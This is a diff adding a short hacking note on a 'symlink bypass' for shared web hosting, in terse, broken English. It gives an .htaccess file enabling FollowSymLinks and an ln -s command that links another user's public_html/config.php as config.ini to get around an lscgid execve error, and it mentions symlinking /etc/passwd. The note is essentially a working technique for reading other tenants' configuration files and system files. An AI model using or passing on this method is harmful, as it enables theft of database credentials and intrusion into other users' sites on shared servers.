@@ -1,0 +1,28 @@
+Symlink Bypass
+############################################
+symlink bypass with ini method
+when you symlink /etc/passwd and you can read it
+but symlink /home/user/public_html/config.php opposite with error :
+lscgid : execve() :/home/[patch]/public_html/
+now you make a .htaccess file in current directory and copy this contain in it:
+
+
+then symlink with this command:
+
+
+ln -s /home/user/public_html/config.php config.ini
+
+
+you see bypassed error execve() :/home/[patch]/public_html/ and can
+you read config.ini
+########################################################################
+
+
+.htaccess file:
+
+
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+
+
+########################################################################
